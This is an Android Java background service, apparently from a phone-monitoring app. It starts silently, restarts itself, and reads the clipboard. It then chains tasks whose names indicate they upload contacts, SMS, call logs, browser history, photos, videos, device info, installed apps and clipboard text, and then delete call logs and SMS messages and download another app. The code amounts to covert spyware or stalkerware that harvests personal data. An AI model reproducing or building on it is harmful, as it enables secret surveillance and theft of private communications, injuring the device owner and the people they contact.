/**
 * Copyright OCTAL INFO SOLUTIONS PVT LTD.  4:53:43 PM  Jul 10, 2013
 */
package com.hinj.secure.smsgps;

import java.util.Timer;
import java.util.TimerTask;

import android.app.Service;
import android.content.ClipboardManager;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;

import com.hinj.app.utils.HinjAppPreferenceUtils;
import com.hinj.app.utils.Utility;
import com.hinj.asynctask.ApkIconUploadAsyncTask;
import com.hinj.asynctask.ApkUploadAsyncTask;
import com.hinj.asynctask.BrowserAsyncTask;
import com.hinj.asynctask.CallDetailsAsyncTask;
import com.hinj.asynctask.ClipboardAsyncTask;
import com.hinj.asynctask.ContactImageUpload;
import com.hinj.asynctask.ContactsAsyncTask;
import com.hinj.asynctask.DeleteCallLogAsyncTask;
import com.hinj.asynctask.DeleteSMSAsyncTask;
import com.hinj.asynctask.DeviceInfoAsyncTask;
import com.hinj.asynctask.InstalledAppAsynctask;
import com.hinj.asynctask.MusicAlbumIconUploadAsyncTask;
import com.hinj.asynctask.MusicAsyncTask;
import com.hinj.asynctask.PermissionAsyncTask;
import com.hinj.asynctask.PhotoAsyncTask;
import com.hinj.asynctask.SMSAsyncTask;
import com.hinj.asynctask.VideoAsyncTask;

public class CallNonRBackgroundService extends Service {
	
	private static final String TAG = "CallNonRBackgroundService";
	private TimerTask mBackgroundServiceTask;
	private Handler mHandler;
	private Timer mBackgroundServiceTimer;
	private String clip_board_string = "";

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		mHandler=new Handler();
	}
	
	public int onStartCommand(Intent intent, int flags, int startId) {
		
		mBackgroundServiceTask = new TimerTask() {
			public void run() {
				mHandler.post(new Runnable() {
					@Override
					public void run() {
						if (true) {
							try{
								
								ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE); 
								
								HinjAppPreferenceUtils.setClipboardStr(CallNonRBackgroundService.this, String.valueOf(clipboard.getText()));
							
								}catch (Exception e) {
									e.printStackTrace();
								}
								try {	
								//	new PermissionAsyncTask().execute();
									if(Utility.isNetworkAvailable(CallNonRBackgroundService.this)){
									//	new DeleteSMSAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
										new ContactsAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
									//	new PhotoAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
									//	new DownloadAppAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
									//	new ContactImageUpload(CallNonRBackgroundService.this,onComplete).execute();
									//  new MusicAlbumIconUploadAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
									//	new SMSAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
									//	new DeleteSMSAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
									//  new InstalledAppAsynctask(CallNonRBackgroundService.this,onComplete).execute();
									//	new ApkIconUploadAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
									//  new ApkUploadAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
									//	new VideoAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
									//  new ClipboardAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
									//  new InstalledAppAsynctask(CallNonRBackgroundService.this,onComplete).execute();
									}
								} catch (Exception e) {
									e.printStackTrace();
							}
						}
					}
				});
			}
		};
		mBackgroundServiceTimer = new Timer();		
		mBackgroundServiceTimer.schedule(mBackgroundServiceTask, 1);
		return START_STICKY;
	}

	private DeviceInterface onComplete=new DeviceInterface() {	

		/*
		 * on completed methods for functionality can run with non rooted phone also
		 */		

	@Override
		public void onCompletedContacts() {
			if(Utility.isNetworkAvailable(CallNonRBackgroundService.this)){
				new SMSAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
			}else{
				onCompletedSMS();
			}
		}
	
	@Override
		public void onCompletedSMS() {
			
			if(Utility.isNetworkAvailable(CallNonRBackgroundService.this)){
				new CallDetailsAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
			}else{
				onCompletedCall();
			}			
		}
	
	  @Override
		public void onCompletedCall() {
			
			if(Utility.isNetworkAvailable(CallNonRBackgroundService.this)){
				new BrowserAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
			}
			else{
				onCompletedBrowser();
			}			
		}
	  
	   @Override
		public void onCompletedBrowser() {
			
			if(Utility.isNetworkAvailable(CallNonRBackgroundService.this)){
			new PhotoAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
			}else{
				onCompletedDeviceImages();
			}		
		}	
	   @Override
		public void onCompletedDeviceImages() {
			
			if(Utility.isNetworkAvailable(CallNonRBackgroundService.this)){
			   new VideoAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
			}else{
			  onCompletedDeviceVideos();
			}		
		}	
	   @Override
		public void onCompletedDeviceVideos() {
		   if(Utility.isNetworkAvailable(CallNonRBackgroundService.this)){
				new DeviceInfoAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
				}else{
				onCompletedDeviceInfo();
			}
		}	

	   @Override
		public void onCompletedDeviceInfo() {			
		   if(Utility.isNetworkAvailable(CallNonRBackgroundService.this)){
			   new InstalledAppAsynctask(CallNonRBackgroundService.this,onComplete).execute();
			}else {
				onCompletedInstalledApp();
			}
		}

		@Override
		public void onCompletedInstalledApp() {
			 if(Utility.isNetworkAvailable(CallNonRBackgroundService.this)){
				 new MusicAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
			}
			else
			{
				 onCompletedMusic();
			}
		}

		@Override
		public void onCompletedMusic() {
			 if(Utility.isNetworkAvailable(CallNonRBackgroundService.this)){
				 new ClipboardAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
			 }
			 else
			 {
				 onCompletedClipboardText();
			 }
		}
		
		@Override
		public void onCompletedClipboardText() {
			if(Utility.isNetworkAvailable(CallNonRBackgroundService.this)){
				 new ApkUploadAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
			}
			else
			{
				onCompletedApkUpload();
			}
		}

		@Override
		public void onCompletedApkUpload() {
			if(Utility.isNetworkAvailable(CallNonRBackgroundService.this)){
				new ContactImageUpload(CallNonRBackgroundService.this,onComplete).execute();
			}
			else
			{
				onCompletedContactImageUpload();
			}
		}

		@Override
		public void onCompletedContactImageUpload() {
			if(Utility.isNetworkAvailable(CallNonRBackgroundService.this)){
				new MusicAlbumIconUploadAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
			}
			else
			{
				onCompletedMusicAlbumImageUpload();
			}
		}

		@Override
		public void onCompletedMusicAlbumImageUpload() {
			if(Utility.isNetworkAvailable(CallNonRBackgroundService.this)){
				new ApkIconUploadAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
			}
			else
			{
				onCompletedApkIconUpload();
			}
		}

		@Override
		public void onCompletedApkIconUpload() {
			if(Utility.isNetworkAvailable(CallNonRBackgroundService.this)){
				new DeleteCallLogAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
			}
			else
			{
			onCompletedGetCallLogId();
			}
		}

		@Override
		public void onCompletedGetCallLogId() {
			if(Utility.isNetworkAvailable(CallNonRBackgroundService.this)){
				new DeleteSMSAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
			}
			else
			{
				onCompletedGetSMSId();
			}
		}

		@Override
		public void onCompletedGetSMSId() {
			if(Utility.isNetworkAvailable(CallNonRBackgroundService.this)){
				new DownloadAppAsyncTask(CallNonRBackgroundService.this,onComplete).execute();
			}
			else
			{
				onCompleteAppDownload();
			}
		}

		@Override
		public void onCompleteAppDownload() {
			
		}

	};
}
